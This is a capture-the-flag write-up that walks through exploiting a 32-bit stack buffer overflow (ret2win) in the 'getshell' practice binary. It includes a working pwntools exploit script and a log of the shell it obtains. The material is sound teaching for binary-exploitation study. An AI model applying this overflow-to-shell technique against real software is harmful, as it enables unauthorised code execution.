# wustctf2020_getshell — Full Writeup (ret2win, x86-32)

**Category:** Binary Exploitation / pwn
**Difficulty:** Easy
**Arch:** i386, dynamically linked, not stripped
**Author:** Gantosay
---

## 1. Binary Recon

```
$ file get
get: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, not stripped

$ pwn checksec --file=get
Arch:       i386-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x8048000)
Stripped:   No
```

What matters here before writing a single line of exploit code:

- **No canary** → we're allowed to overwrite the saved return address without
  any integrity check blowing up the process first.
- **No PIE** → every address in the binary (functions, strings, everything) is
  at a *fixed*, predictable location every single run. We can hardcode
  addresses directly.
- **NX enabled** → we cannot jump into the stack and execute shellcode we
  planted there. We need to reuse code that already exists in the binary
  (classic **ret2win**, since a `shell()` function conveniently already calls
  `system("/bin/sh")` for us).
- **Not stripped** → symbol names (`vulnerable`, `shell`, `main`) are visible,
  which makes this a great beginner challenge: no need to reverse-engineer
  function boundaries by hand.

```
$ strings get
...
read
alarm
system
setvbuf
/bin/sh
...
vulnerable
shell
```

Seeing `system`, `/bin/sh`, and a function literally named `shell` in the
symbol table is a massive hint before we've even opened a disassembler:
this is almost certainly a **ret2win** challenge, where some unreachable
function already does the "win" action for us, and our only job is to
redirect execution into it.

---

## 2. Disassembly — `vulnerable()`, instruction by instruction

```asm
08048582 <vulnerable>:
 8048582: 55                   push   %ebp
 8048583: 89 e5                mov    %esp,%ebp
 8048585: 83 ec 18             sub    $0x18,%esp
 8048588: 83 ec 04             sub    $0x4,%esp
 804858b: 6a 20                push   $0x20
 804858d: 8d 45 e8             lea    -0x18(%ebp),%eax
 8048590: 50                   push   %eax
 8048591: 6a 00                push   $0x0
 8048593: e8 18 fe ff ff       call   80483b0 <read@plt>
 8048598: 83 c4 10             add    $0x10,%esp
 804859b: 90                   nop
 804859c: c9                   leave
 804859d: c3                   ret
```

**`push %ebp`** — saves the caller's (`main`'s) base pointer onto the stack.
We're about to repurpose `ebp` for `vulnerable`'s own frame, so the old value
has to be preserved somewhere so it can be restored on return. This saved
value is exactly what our payload has to walk past — it's the "saved ebp"
slot everyone refers to in the classic padding formula.

**`mov %esp,%ebp`** — sets up the new frame pointer. From here on, every
`-0x..(%ebp)` reference is "N bytes below this fixed point" — this is our
coordinate system for everything that follows.

**`sub $0x18,%esp`** — reserves `0x18` = **24 decimal** bytes of stack space
for local variables. This is the local buffer's size.

**`sub $0x4,%esp`** — a compiler-inserted alignment adjustment before the
upcoming `call`. It does not correspond to any variable we care about and has
zero effect on our exploit math.

**`push $0x20`, `lea -0x18(%ebp),%eax` / `push %eax`, `push $0x0`** — these
three `push`es build the argument list for `read()`, in *reverse* order
because of the **cdecl** calling convention (args pushed right-to-left):

```c
read(int fd, void *buf, size_t count);
```

- `push $0x20` → 3rd arg, `count = 32` — the **read cap**: the absolute
  maximum number of bytes `read()` will ever accept here.
- `lea -0x18(%ebp),%eax` then `push %eax` → 2nd arg, `buf` = `ebp - 0x18`,
  which is *exactly* the address the `sub $0x18,%esp` reserved. This is the
  start of our buffer.
- `push $0x0` → 1st arg, `fd = 0` (stdin).

**`call read@plt`** — reads up to 32 bytes from stdin into the buffer at
`ebp-0x18`.

**`leave`** — shorthand for two instructions:
```asm
mov %ebp, %esp   ; collapse the local stack frame
pop %ebp         ; restore the caller's saved ebp (the one we pushed at entry)
```

**`ret`** — pops a 4-byte value off the top of the stack and jumps to it.
After `leave` has already popped `saved ebp`, the very next 4 bytes on the
stack *are* the return address. Whatever we've written there is where
execution goes next.

---

## 3. The padding formula — where does 28 come from?

Stack layout from the moment `read()` starts writing (low address → high
address):

```
ebp - 0x18  ┌───────────────────────────┐
            │   buffer (24 bytes)        │
ebp         ├───────────────────────────┤
            │   saved ebp (4 bytes)      │
ebp + 4     ├───────────────────────────┤
            │   return address (4 bytes) │  ← our target
            └───────────────────────────┘
```

```
padding = buffer_size + saved_ebp_size
        = 24 + 4
        = 28 bytes
```

After those 28 bytes of junk, whatever we write next lands exactly on the
return address.

**Why does the total payload come out to exactly 32 bytes?** Because the read
cap (`push $0x20` = 32) happens to equal `28 (padding) + 4 (address we
overwrite the return address with)`. This is not a coincidence we created —
the challenge author sized the buffer specifically so that a clean 4-byte
address overwrite fits *exactly* at the cap, no more, no less.

**General rule to check before writing any payload:**

```
write_cap > padding_to_return_address
```

It must be *strictly greater*, by at least 4 bytes (32-bit) or 8 bytes
(64-bit) — enough room for the full address we're writing. If `write_cap`
is less than or equal to the padding, the return address can never be
reached, full stop — no amount of cleverness fixes that; you'd need a
different vulnerability entirely.

---

## 4. Disassembly — `shell()`, and why no fake-return-address trick is needed

```asm
0804851b <shell>:
 804851b: 55                   push   %ebp
 804851c: 89 e5                mov    %esp,%ebp
 804851e: 83 ec 08             sub    $0x8,%esp
 8048521: 83 ec 0c             sub    $0xc,%esp
 8048524: 68 50 86 04 08       push   $0x8048650
 8048529: e8 b2 fe ff ff       call   80483e0 <system@plt>
 804852e: 83 c4 10             add    $0x10,%esp
 8048531: 90                   nop
 8048532: c9                   leave
 8048533: c3                   ret
```

When `vulnerable()`'s `ret` fires, the CPU jumps straight to `0x0804851b`
— the **first instruction** of `shell`, `push %ebp`. This behaves exactly
as if `shell()` had been called normally: it builds its own fresh stack
frame and then does:

```asm
push $0x8048650     ; a hardcoded address — the "/bin/sh" string in .rodata
call system@plt
```

The argument to `system()` is **hardcoded inside `shell()` itself** — we
never have to supply it. This is the key difference from an "argument-taking
ret2win" (where you'd need to overwrite the return address *and* place a
fake return address *and* the argument afterward, because the callee expects
its caller to have pushed the arguments). Here, the callee pushes its own
argument, so a bare 4-byte address overwrite is sufficient.

No stack alignment gadget is needed either — that requirement only applies
to the 64-bit System V ABI (`rsp` must be 16-byte aligned before `call`).
This is 32-bit `cdecl`; no such constraint exists.

---

## 5. Reconstructed C source

```c
#include <stdio.h>
#include <unistd.h>

void shell()
{
    system("/bin/sh");
}

void init()
{
    setvbuf(stdout, 0, 2, 0);   // unbuffered stdout
    alarm(60);                  // kill the process after N seconds (anti-hang)
    puts("   __  ___    ______   ___    \n"
         "  /  |/  /__ /_  __/__<  /_ __\n"
         " / /|_/ / _ `// / / __/ /\\ \\ /\n"
         "/_/  /_/\\_,_//_/ /_/ /_//_\\_\\ \n");
}

void vulnerable()
{
    char buf[24];
    read(0, buf, 32);
}

int main()
{
    init();
    vulnerable();
    return 0;
}
```

**The core bug:** `shell()` is never called anywhere in `main`, `init`, or
`vulnerable` — it's dead code from the program's normal point of view. It
only becomes reachable by hijacking the return address of `vulnerable()`
through the unchecked `read()` overflow.

---

## 6. Exploit script, line by line

```python
from pwn import *

context.arch = 'i386'
context.log_level = 'debug'

io = process('./get')          # or: remote('HOST', PORT)

shell_addr = 0x0804851b

padding = b'A' * 28            # 24 (buffer) + 4 (saved ebp)
payload = padding + p32(shell_addr)

io.send(payload)
io.interactive()
```

- `context.arch = 'i386'` — tells pwntools the target word size (affects
  `p32`/`p64` defaults and a few other things).
- `io = process('./get')` — spawns the binary locally for testing before
  attacking the real remote service. Since the binary is **No PIE**, every
  address stays identical between local and remote runs (as long as it's
  the exact same binary), so we can test the full exploit locally first.
- `shell_addr = 0x0804851b` — taken directly from `objdump`'s
  `0804851b <shell>:` symbol address.
- `padding = b'A' * 28` — fills the buffer and the saved-ebp slot. The
  actual byte value (`A` / `0x41`) is irrelevant, since neither region is
  ever read again after the return address is overwritten.
- `p32(shell_addr)` — packs the integer `0x0804851b` into 4 raw bytes in
  **little-endian** order: `1b 85 04 08`. This matches what the hexdump
  showed:
  ```
  41 41 41 41 ... 41 41 41 41  1b 85 04 08
  └──────── 28×'A' ─────────┘  └ shell() addr ┘
  ```
- `io.send(payload)` — note `send`, not `sendline`: the payload is exactly
  32 bytes and must not be padded with an extra `\n`, or the read cap could
  be hit in a way that cuts off part of the intended data.
- `io.interactive()` — hands control of the socket/pipe to the terminal,
  so once `system("/bin/sh")` runs, we can type shell commands directly.

### Verified local run

```
[DEBUG] Sent 0x20 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    00000010  41 41 41 41  41 41 41 41  41 41 41 41  1b 85 04 08  │AAAA│AAAA│AAAA│····│
[*] Switching to interactive mode
$ id
uid=1000(noop) gid=1000(noop) groups=1000(noop),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

Shell confirmed — exploit works exactly as predicted by the math, with
nothing left to the sqrt of chance.

---

## 7. Key Takeaways

- **No-PIE + not-stripped + visible "win" function in `strings`** is a
  near-guaranteed signal for a classic ret2win before you even open a
  disassembler.
- **Padding formula (32-bit, frame pointer present):**
  `padding = distance_from_buffer_start_to_ebp + 4`
  (the `+4` is the saved `ebp` slot itself).
- **The write cap and the buffer size are two independent numbers.** The
  buffer size determines how much padding is needed; the read/write cap
  (e.g. `read()`'s 3rd argument) determines the ceiling on total bytes you
  can ever deliver in one call. You must check:
  `write_cap > padding_to_return_address`, with enough slack for the full
  address (4 bytes on 32-bit).
- **A single, non-looped `read()` call means a single shot.** If the cap is
  too small to reach the return address, you cannot "send more later" —
  there is no second call to exploit. You need a different vulnerability.
- **`leave; ret` tells you exactly what's on the stack when `ret` fires:**
  `leave` = `mov esp,ebp; pop ebp`, so right after it, the top of the stack
  is the return address, full stop.
- **Jumping directly to a function's first instruction (`push ebp`) behaves
  identically to that function being called normally** — it builds its own
  frame and pushes its own arguments, so if the "win" function hardcodes its
  own arguments (like `shell()` does with `"/bin/sh"`), no fake return
  address or extra argument staging is required on our end.
- **cdecl (32-bit) has no stack-alignment requirement before `ret`-jumping
  into a function**, unlike the System V AMD64 ABI, which can require an
  extra alignment gadget.
- **Little-endian packing matters for verification**: when you hexdump your
  sent payload, the address bytes will appear reversed from how you'd write
  them normally (`1b 85 04 08` for `0x0804851b`) — recognizing this pattern
  is a fast sanity check that your payload was built correctly.

---

## 8. Quiz Yourself — "What if...?" questions

Try answering each of these *before* scrolling to the explanation. They're
designed to test whether the padding formula and the write-cap concept
actually generalize for you, not just for this one binary.

1. **What if `sub $0x18,%esp` had been `sub $0x14,%esp` (20 bytes) instead,
   with everything else unchanged?**
   <details><summary>Answer</summary>
   Padding becomes `20 + 4 = 24` bytes. Total payload: `24 + 4 = 28` bytes,
   which is still comfortably under the 32-byte read cap — the exploit
   still works, just with a shorter padding and 4 leftover bytes of slack
   you could fill with anything (or simply not send).
   </details>

2. **What if the read cap were `push $0x1c` (28 bytes) instead of `0x20`,
   with the buffer unchanged at 24 bytes?**
   <details><summary>Answer</summary>
   Padding needed is still 28 bytes (24 + 4). The cap exactly equals the
   padding, leaving *zero* bytes to write the actual return address. The
   saved-ebp slot gets fully overwritten but the return address does not —
   `vulnerable()` returns normally with no crash and no shell. This is the
   "equal, not greater" trap: `write_cap > padding` must be a strict
   inequality.
   </details>

3. **What if the buffer were 60 bytes (`sub $0x3c,%esp`) but the read cap
   stayed at 32 bytes?**
   <details><summary>Answer</summary>
   Padding required would be `60 + 4 = 64` bytes, but we can never send more
   than 32. The return address is simply unreachable through this call —
   not "harder to reach," genuinely impossible via this bug. You'd need to
   find a different vulnerability in the binary (a second write primitive,
   a format string, etc.), not a cleverer payload for this one.
   </details>

4. **What if `read()` were called inside a `while` loop instead of once?**
   <details><summary>Answer</summary>
   Then the single-call write cap no longer caps the *total* bytes you can
   deliver across the program's lifetime — you could potentially send your
   payload in multiple chunks across multiple calls, as long as the loop
   keeps writing to the same growing buffer region and you can still land
   on the return address eventually. This is the only scenario where
   "splitting the payload into pieces" would actually make sense — and it's
   not what this challenge does.
   </details>

5. **Why didn't we need a `ret` alignment gadget before jumping into
   `shell()`, the way a 64-bit ret2win sometimes needs one?**
   <details><summary>Answer</summary>
   Stack alignment before `call`/function entry is a requirement of the
   System V AMD64 (64-bit) ABI specifically, not of cdecl (32-bit). This
   binary is i386/cdecl, so no such constraint exists — we can jump straight
   to the function's first instruction with no extra padding gadget.
   </details>

6. **Why does `shell()` not need a fake return address pushed after its own
   address, unlike an argument-taking `win(arg1)`-style ret2win?**
   <details><summary>Answer</summary>
   Because `shell()`'s argument to `system()` is *hardcoded inside the
   function itself* (`push $0x8048650`) rather than expected to already be
   sitting on the stack from the caller. An argument-taking win function
   expects its caller to have pushed the arguments *before* the call — since
   we're faking that call via `ret` rather than a real `call` instruction,
   we'd normally have to manually place a fake return address plus the
   arguments ourselves. Here, the function supplies its own argument, so
   none of that staging is necessary.
   </details>

7. **If the binary had PIE enabled, would this exact exploit script still
   work unmodified?**
   <details><summary>Answer</summary>
   No. With PIE, the base load address of the binary is randomized on every
   run, so `shell_addr = 0x0804851b` would only be correct by coincidence.
   You'd need either an information leak to compute the real runtime base
   address first, or a brute-force approach (impractical for 32-bit PIE's
   small randomization range, more relevant for 64-bit). The hardcoded
   address in this writeup only works *because* `checksec` showed
   `No PIE`.
   </details>

---
